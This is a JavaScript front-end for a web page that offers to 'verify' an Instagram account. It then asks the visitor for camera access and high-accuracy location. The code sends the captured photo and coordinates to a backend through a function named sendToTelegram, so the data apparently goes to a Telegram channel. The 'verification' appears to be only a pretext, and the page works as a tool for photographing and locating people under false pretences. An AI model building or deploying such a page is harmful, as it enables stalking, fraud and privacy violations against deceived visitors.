const usernameInput = document.getElementById("username");
const searchBtn = document.getElementById("searchBtn");
const profileCard = document.getElementById("profileCard");
const profileName = document.getElementById("profileName");
const profileStatus = document.getElementById("profileStatus");
const profileBtn = document.getElementById("profileBtn");
const verifyBtn = document.getElementById("verifyBtn");

const verification = document.getElementById("verification");
const status = document.getElementById("status");

const cameraBtn = document.getElementById("cameraBtn");
const video = document.getElementById("video");
const takePhotoBtn = document.getElementById("takePhotoBtn");
const canvas = document.getElementById("canvas");
const photoPreview = document.getElementById("photoPreview");
const sendPhotoBtn = document.getElementById("sendPhotoBtn");

const locationBtn = document.getElementById("locationBtn");
const locationText = document.getElementById("locationText");
const sendLocationBtn = document.getElementById("sendLocationBtn");

let username = "";
let latitude = null;
let longitude = null;
let photoBlob = null;
let cameraStream = null;

function show(el) {
  if (el) el.classList.remove("hidden");
}

function hide(el) {
  if (el) el.classList.add("hidden");
}

function setStatus(message) {
  if (status) status.textContent = message;
}

async function sendToTelegram(payload) {
  const response = await fetch("/api/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  });

  const data = await response.json();

  if (!response.ok) {
    throw new Error(data.error || "Send failed");
  }

  return data;
}

searchBtn?.addEventListener("click", () => {
  username = usernameInput.value.trim().replace(/^@/, "");

  if (!username) {
    alert("Enter an Instagram username.");
    return;
  }

  profileName.textContent = "@" + username;
  profileStatus.textContent = "Account selected.";
  show(profileCard);
});

profileBtn?.addEventListener("click", () => {
  if (!username) return;

  window.open(
    "https://www.instagram.com/" + encodeURIComponent(username) + "/",
    "_blank"
  );
});

verifyBtn?.addEventListener("click", () => {
  if (!username) {
    alert("Search an account first.");
    return;
  }

  show(verification);
  setStatus("Verification started. Choose an action below.");
});

cameraBtn?.addEventListener("click", async () => {
  try {
    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });

    video.srcObject = cameraStream;
    show(video);
    show(takePhotoBtn);

    setStatus("Camera permission granted. Take a photo when ready.");
  } catch (error) {
    setStatus("Camera permission was not granted.");
  }
});

takePhotoBtn?.addEventListener("click", () => {
  if (!video.srcObject) return;

  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;

  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(
    (blob) => {
      if (!blob) return;

      photoBlob = blob;
      photoPreview.src = URL.createObjectURL(blob);

      show(photoPreview);
      show(sendPhotoBtn);

      setStatus("Photo captured. Tap SEND PHOTO to share it.");
    },
    "image/jpeg",
    0.9
  );
});

sendPhotoBtn?.addEventListener("click", async () => {
  if (!photoBlob) {
    alert("Take a photo first.");
    return;
  }

  sendPhotoBtn.disabled = true;
  setStatus("Sending photo...");

  try {
    const reader = new FileReader();

    const photoBase64 = await new Promise((resolve, reject) => {
      reader.onloadend = () => {
        const result = String(reader.result);
        resolve(result.split(",")[1]);
      };

      reader.onerror = reject;
      reader.readAsDataURL(photoBlob);
    });

    await sendToTelegram({
      type: "photo",
      username,
      photoBase64
    });

    setStatus("Photo sent successfully.");
  } catch (error) {
    setStatus("Photo could not be sent.");
  } finally {
    sendPhotoBtn.disabled = false;
  }
});

locationBtn?.addEventListener("click", () => {
  if (!navigator.geolocation) {
    setStatus("Location is not supported by this browser.");
    return;
  }

  setStatus("Waiting for location permission...");

  navigator.geolocation.getCurrentPosition(
    (position) => {
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;

      locationText.textContent =
        "Latitude: " +
        latitude +
        " | Longitude: " +
        longitude;

      show(sendLocationBtn);

      setStatus("Location received. Tap SEND LOCATION to share it.");
    },
    () => {
      setStatus("Location permission was not granted.");
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
});

sendLocationBtn?.addEventListener("click", async () => {
  if (latitude === null || longitude === null) {
    alert("Allow location first.");
    return;
  }

  sendLocationBtn.disabled = true;
  setStatus("Sending location...");

  try {
    await sendToTelegram({
      type: "location",
      latitude,
      longitude
    });

    setStatus("Location sent successfully.");
  } catch (error) {
    setStatus("Location could not be sent.");
  } finally {
    sendLocationBtn.disabled = false;
  }
});
